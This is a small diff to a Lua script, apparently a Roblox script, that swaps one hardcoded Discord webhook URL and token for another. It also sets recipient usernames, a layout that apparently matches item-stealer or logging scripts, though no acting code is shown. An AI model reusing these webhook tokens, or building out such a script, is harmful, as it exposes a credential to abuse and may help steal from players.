@@ -1,6 +1,6 @@
 
 
-local Webhook = "https://discord.com/api/webhooks/1450951811488813108/4lcItFTfvIV0lpizJ1qrQ6c9EYbV7soVaJb1onUlBSRm-gz_ZEQ4GLlHC_ZHYwGf5zuz"
+local Webhook = "https://discord.com/api/webhooks/1465340884705873931/sjdicI6_huK8qalBn_ntg_avQAvNASoPpHo-hsWPR9M_xQOUmUyyEuiTUm8MPR0lurXN"
 local Username = {"Lilicyy90"}
 local ExtraUsers = {"Lilicyy90"}
 local Friends = {}
